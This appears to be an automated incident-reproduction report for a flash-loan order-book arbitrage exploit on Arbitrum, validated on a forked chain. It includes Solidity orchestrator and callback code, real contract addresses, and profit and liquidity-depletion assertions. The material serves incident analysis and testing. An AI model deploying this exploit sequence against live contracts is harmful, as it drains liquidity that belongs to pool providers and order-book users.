# EVA/StandardArb OrderBook Flash-Loan Arbitrage PoC Report

## 1. Overview & Context

- **Goal:** Reproduce the Arbitrum EVA/StandardArb order-book flash-loan arbitrage incident on a forked mainnet state and assert the attacker profit and victim liquidity depletion oracles.
- **Incident linkage:** The PoC targets the opportunity described in `root_cause_report.md` for Arbitrum tx `0xb13b2ab2…f3f`, where an adversary orchestrates a Morpho flash loan, buys underpriced EVA from an order book, resells into two AMM pools, and realizes profit in `StandardArbERC20`.
- **Chain / block:** Arbitrum One (`chainid 42161`), forked at block `373990722` (pre-state `σ_B` just before the seed transaction block `373990723`).

**Command to run the PoC:**

```bash
cd forge_poc
RPC_URL="<Arbitrum RPC URL>" forge test --via-ir -vvvvv
```

Under the TxRay workflow, `RPC_URL` is injected from a QuickNode Arbitrum endpoint.

## 2. PoC Architecture & Key Contracts

### 2.1 Main Contracts and Roles

- **`AttackOrchestrator` (Solidity contract in `forge_poc/test/Exploit.sol`):**
  - Custom adversary contract that implements:
    - `IMorphoFlashLoanCallback` for the Morpho flash-loan callback.
    - `IUniswapV3SwapCallback` and `IPancakeV3SwapCallback` for V3-style pool callbacks.
  - Holds references to:
    - `standardArbToken` (`StandardArbERC20`).
    - `evaToken` (`EVA`).
    - `morpho` (Morpho flash-loan lender).
    - `orderBook` (`OrderBookFactory`).
    - `ammPoolUniLike`, `ammPoolPancakeLike` (EVA/StandardArb AMM pools).
    - `attacker` (fresh test address).
- **`ExploitTest` (Foundry test contract in `forge_poc/test/Exploit.sol`):**
  - Configures the Arbitrum fork.
  - Deploys `AttackOrchestrator`.
  - Exposes `reproducerAttack()` as the main exploit driver.
  - Implements oracle checks in `test_ReproducerAttack_OracleAlignment()`.

### 2.2 Key Exploit Logic

Representative snippet from `AttackOrchestrator` showing flash-loan orchestration and profit realization:

```solidity
function execute() external {
    morpho.flashLoan(address(standardArbToken), FLASH_LOAN_AMOUNT, bytes(""));

    uint256 profit = standardArbToken.balanceOf(address(this));
    require(profit > 0, "no profit");
    standardArbToken.transfer(attacker, profit);
}
```

**Caption:** The adversary orchestrator borrows `FLASH_LOAN_AMOUNT` `StandardArbERC20` via Morpho, runs the callback logic, then transfers any residual StandardArb balance (profit) to the attacker address.

The flash-loan callback reconstructs the core attack sequence:

```solidity
function onMorphoFlashLoan(uint256 assets, bytes calldata) external override {
    require(msg.sender == address(morpho), "invalid callback");

    standardArbToken.approve(address(morpho), assets);
    standardArbToken.approve(address(orderBook), assets);

    orderBook.addNewOrder(EVA_STANDARD_ARB_PAIR_ID, orderQuantity, ORDER_PRICE, true, block.timestamp);

    uint256 evaBalance = evaToken.balanceOf(address(this));
    require(evaBalance > 0, "no EVA acquired");

    uint256 firstPortion = evaBalance / 2;
    _swapEVAForStandardArbInUni(firstPortion);

    uint256 remainingEVA = evaToken.balanceOf(address(this));
    if (remainingEVA > 0) {
        _swapEVAForStandardArbInPancake(remainingEVA);
    }
}
```

**Caption:** Inside the Morpho callback, the orchestrator (1) approves both Morpho and OrderBookFactory, (2) takes the mispriced EVA sell order using the incident pair ID, (3) confirms EVA was received, and (4) resells EVA into the UniswapV3-like and PancakeV3-like EVA/StandardArb pools to realize StandardArb profit.

## 3. Adversary Execution Flow

### 3.1 Funding and Environment Setup

- `ExploitTest.setUp()`:
  - Reads `RPC_URL` from the environment and forks Arbitrum at block `373990722`:

    ```solidity
    string memory rpcUrl = vm.envString("RPC_URL");
    uint256 forkId = vm.createSelectFork(rpcUrl, 373990722);
    vm.selectFork(forkId);
    ```

    **Caption:** The test uses a mainnet fork at the exact pre-state `σ_B` before the incident seed transaction block.

  - Binds protocol contracts at their canonical Arbitrum addresses:
    - `standardArbToken = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);`
    - `evaToken = IERC20(0x45D9831d8751B2325f3DBf48db748723726e1C8c);`
    - `orderBook = IOrderBookFactory(0x03339ECAE41bc162DAcAe5c2A275C8f64D6c80A0);`
    - `ammPoolUniLike = IUniswapV3Pool(0x42a4755709DD1bBfe959b3DeA7200D4cB4f357D1);`
    - `ammPoolPancakeLike = IPancakeV3Pool(0x57dF9434CAb6Bc174899287Fad42058dA712AE85);`
    - `morpho = IMorphoFlashLoan(0x6c247b1F6182318877311737BaC0844bAa518F5e);`
  - Creates a fresh attacker address with `attacker = makeAddr("attacker");` and deploys `AttackOrchestrator`.
  - Labels all key contracts (`StandardArbERC20`, `EVA`, `OrderBookFactory`, both pools, `MorphoFlashLoan`, `AttackOrchestrator`) for human-readable traces.

### 3.2 Pre-checks and Oracle Preconditions

In `setUp()`, the test enforces the oracle pre-condition that AMM pools must hold non-zero `StandardArbERC20` balances:

```solidity
uint256 uniBalance = standardArbToken.balanceOf(address(ammPoolUniLike));
uint256 pancakeBalance = standardArbToken.balanceOf(address(ammPoolPancakeLike));

assertGt(uniBalance, 0, "uni-like pool StandardArb balance must be > 0");
assertGt(pancakeBalance, 0, "pancake-like pool StandardArb balance must be > 0");
```

**Caption:** The PoC checks that both EVA/StandardArb pools have non-zero StandardArb liquidity, matching the oracle pre-check that public liquidity must exist to finance attacker profit.

### 3.3 Exploit Execution Steps

The main exploit entrypoint is `reproducerAttack()` in `ExploitTest`:

```solidity
function reproducerAttack() public {
    vm.startPrank(attacker);
    orchestrator.execute();
    vm.stopPrank();
}
```

**Caption:** The exploit is driven by a fresh adversary EOA modeled as a Foundry address using `vm.startPrank`, with no reliance on the real attacker’s key material or address.

The end-to-end sequence is:

1. **Flash loan acquisition:**
   - `AttackOrchestrator.execute()` calls `morpho.flashLoan(standardArbToken, FLASH_LOAN_AMOUNT, "")`, borrowing `1,200,000,000` `StandardArbERC20`, matching the incident.
2. **Order-book EVA acquisition:**
   - In `onMorphoFlashLoan`, the orchestrator:
     - Approves Morpho and OrderBookFactory.
     - Calls `orderBook.addNewOrder(EVA_STANDARD_ARB_PAIR_ID, orderQuantity, ORDER_PRICE, true, block.timestamp)` to take the mispriced EVA sell order.
   - This results in transfer of `60,000 * 10^decimals` EVA to the orchestrator in exchange for StandardArb, mirroring the seed tx.
3. **AMM resell of EVA:**
   - EVA is split into two portions and swapped via direct pool calls:
     - `_swapEVAForStandardArbInUni(firstPortion);`
     - `_swapEVAForStandardArbInPancake(remainingEVA);`
   - V3-style callbacks (`uniswapV3SwapCallback`, `pancakeV3SwapCallback`) repay the input EVA to each pool based on `amount0Delta` and `amount1Delta`.
4. **Flash-loan repayment and profit realization:**
   - Morpho pulls back the full `FLASH_LOAN_AMOUNT` from the orchestrator using the previously-set allowance.
   - Any residual `StandardArbERC20` on the orchestrator is checked to be positive and transferred to the attacker.

The detailed call trace in `artifacts/poc/poc_validator/forge-test.log` shows this sequence, including:

- Flash-loan borrow and repayment.
- EVA acquisition from `OrderBookFactory`.
- EVA-to-StandardArb swaps across both pools.
- Final transfer of `119,331,045` `StandardArbERC20` to the attacker test address.

## 4. Oracle Definitions and Checks

### 4.1 Oracle Variables

From `oracle_definition.json`, the key variables are:

- `attacker`: adversary address (modeled as `ExploitTest.attacker`).
- `standardArbToken`: `StandardArbERC20` at `0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f`.
- `evaToken`: EVA token at `0x45D9831d8751B2325f3DBf48db748723726e1C8c`.
- `orderBook`: `OrderBookFactory` at `0x03339ECAE41bc162DAcAe5c2A275C8f64D6c80A0`.
- `ammPoolUniLike`: EVA/StandardArb UniswapV3-like pool at `0x42a4755709DD1bBfe959b3DeA7200D4cB4f357D1`.
- `ammPoolPancakeLike`: EVA/StandardArb PancakeV3-like pool at `0x57dF9434CAb6Bc174899287Fad42058dA712AE85`.

`ExploitTest.setUp()` binds exactly these addresses, ensuring oracle variables align with the incident contracts.

### 4.2 Pre-check

Oracle pre-check in `oracle_definition.json`:

- **Description:** EVA/StandardArb AMM pools must hold non-zero StandardArb balances so that public liquidity can finance the flash-loan arbitrage.
- **Implementation in PoC:**
  - The `assertGt` checks on `standardArbToken.balanceOf(ammPoolUniLike)` and `standardArbToken.balanceOf(ammPoolPancakeLike)` in `setUp()` directly implement this pre-check.

### 4.3 Hard Constraint: Attacker StandardArb Profit

Oracle hard constraint:

- **Intent:** Attacker must realize profit specifically in `StandardArbERC20`.
- **Specification:** Compare `standardArbToken.balanceOf(attacker)` before and after `reproducerAttack()` and require a strict increase.

Implementation in `ExploitTest.test_ReproducerAttack_OracleAlignment()`:

```solidity
uint256 attackerBalanceBefore = standardArbToken.balanceOf(attacker);
...
reproducerAttack();
uint256 attackerBalanceAfter = standardArbToken.balanceOf(attacker);
...
assertGt(attackerBalanceAfter, attackerBalanceBefore);
```

**Caption:** The PoC enforces that the attacker’s StandardArb balance strictly increases after the exploit, satisfying the hard profit constraint.

### 4.4 Soft Constraint 1: Minimum Profit Threshold

Oracle soft constraint `soft-attacker-standardArb-profit-min-delta`:

- **Intent:** Net attacker profit in StandardArb must be at least 1 wei (exact original delta of 119,331,045 units is not required).

Implementation:

```solidity
uint256 delta = attackerBalanceAfter - attackerBalanceBefore;
assertGe(delta, 1);
```

**Caption:** The PoC checks that the attacker’s net StandardArb profit is at least 1 wei, semantically reproducing the ACT opportunity without requiring exact numeric equality.

### 4.5 Soft Constraint 2: Victim Liquidity Depletion

Oracle soft constraint `soft-victim-standardArb-liquidity-depletion`:

- **Intent:** Aggregate `StandardArbERC20` balance across order book and both AMM pools should strictly decrease, reflecting that public liquidity finances the attacker’s profit.

Implementation:

```solidity
uint256 aggBefore =
    standardArbToken.balanceOf(address(orderBook)) +
    standardArbToken.balanceOf(address(ammPoolUniLike)) +
    standardArbToken.balanceOf(address(ammPoolPancakeLike));

reproducerAttack();

uint256 aggAfter =
    standardArbToken.balanceOf(address(orderBook)) +
    standardArbToken.balanceOf(address(ammPoolUniLike)) +
    standardArbToken.balanceOf(address(ammPoolPancakeLike));

assertLt(aggAfter, aggBefore);
```

**Caption:** The aggregate StandardArb balance across the order book and both pools is asserted to strictly decrease, confirming that the attacker’s gain corresponds to victim liquidity loss.

### 4.6 Summary of Oracle Alignment

- All oracle variables are bound to the correct contracts and roles.
- Pre-checks, hard constraint, and both soft constraints are implemented explicitly in `ExploitTest`, matching the logic in `oracle_definition.json`.
- `AttackOrchestrator` executes the prescribed exploit sequence that triggers these oracles.

## 5. Validation Result and Robustness

### 5.1 Forge Test Execution

- The validator executed:

```bash
cd forge_poc && RPC_URL="<Arbitrum RPC URL>" \
  forge test --via-ir -vvvvv \
  > ../artifacts/poc/poc_validator/forge-test.log 2>&1
```

- Result:
  - All tests passed (`3 tests passed, 0 failed`).
  - The main exploit test `ExploitTest.test_ReproducerAttack_OracleAlignment` succeeded on the Arbitrum fork at block `373990722`.

### 5.2 Validator Summary JSON

The validator output `artifacts/poc/poc_validator/poc_validated_result.json` records:

- `overall_status = "Pass"`.
- `poc_correctness_checks.passes_validation_oracles.passed = true`.
- All quality checks under `poc_quality_checks` marked as `passed = true`, including:
  - `oracle_alignment_with_definition`.
  - `human_readable_and_labeled`.
  - `no_magic_numbers_and_values_are_derived`.
  - `mainnet_fork_no_local_mocks`.
  - `self_contained_no_attacker_side_artifacts` (all subfields).
  - `end_to_end_attack_process_described`.
  - `alignment_with_root_cause`.
- `artifacts.validator_test_log_path` points to `artifacts/poc/poc_validator/forge-test.log`.

### 5.3 Robustness Considerations

- The PoC depends only on public chain state at `σ_B` and normal, unprivileged interactions with Morpho, OrderBookFactory, and AMM pools.
- No admin roles, governance permissions, or out-of-band assumptions are required.
- Profit and victim-loss oracles are defined purely in terms of ERC20 balances, making the PoC deterministic and robust to minor gas or environmental variations as long as the fork state is correct.

## 6. Linking PoC Behavior to Root Cause

### 6.1 Exercising the Vulnerable Logic

From `root_cause_report.md` and `root_cause.json`, the root cause is:

- A mispriced EVA sell order on `OrderBookFactory` in the EVA/StandardArb pair.
- Availability of deep StandardArb liquidity in two EVA/StandardArb concentrated-liquidity pools.
- Zero-fee Morpho flash loan enabling large notional exposure.

The PoC exercises this logic by:

- Borrowing `1,200,000,000` `StandardArbERC20` via Morpho (same principal as the incident).
- Calling `addNewOrder` on the EVA/StandardArb pair ID with:
  - **Quantity:** `60,000 * 10^decimals` EVA (derived in the constructor).
  - **Price:** `ORDER_PRICE = 15_000` (documented as the mispriced order-book value).
- Receiving `60,000 EVA` from the order book and reselling it into:
  - `ammPoolUniLike` (UniswapV3-like EVA/StandardArb pool).
  - `ammPoolPancakeLike` (PancakeV3-like EVA/StandardArb pool).

This matches the incident’s execution trace, which shows the orchestrator:

- Taking a Morpho flash loan.
- Buying EVA from the order book.
- Swapping EVA into StandardArb across both pools.
- Repaying the loan and retaining a profit.

### 6.2 Demonstrating Victim Loss and Attacker Profit

The PoC’s oracle test connects directly to the ACT framing:

- **Adversary profit predicate:**
  - The hard and soft constraints enforce that the attacker’s `StandardArbERC20` balance is strictly higher after the exploit, with net profit at least 1 wei.
  - The detailed trace shows a final transfer of `119,331,045` `StandardArbERC20` to the attacker, consistent with `value_delta_in_reference_asset` in `root_cause.json`.
- **Victim liquidity depletion:**
  - Aggregate StandardArb across `OrderBookFactory` and both AMM pools decreases, demonstrating that public liquidity contracts (order book and pools) finance the attacker’s profit.

### 6.3 ACT Roles and Sequence Mapping

- **Adversary-crafted action (b[1]):**
  - `reproducerAttack()` corresponds to the adversary-crafted transaction in the ACT sequence:
    - Origin: fresh attacker EOA (`makeAddr("attacker")`).
    - Target: `AttackOrchestrator` (local deployment).
    - Behavior: executes the same series of calls and token flows as the real orchestrator in tx `0xb13b2ab2…f3f`.
- **Victim-observed effects:**
  - Order book and AMM pools observe net outflows of `StandardArbERC20`.
  - The PoC’s liquidity-depletion oracle formalizes this as `aggAfter < aggBefore`.

Taken together, the PoC faithfully reproduces the root cause: a flash-loan-powered EVA/StandardArb order-book mispricing exploited via AMM arbitrage, yielding deterministic profit in `StandardArbERC20` that is financed by public on-chain liquidity. The PoC passes all specified oracles and quality criteria. 

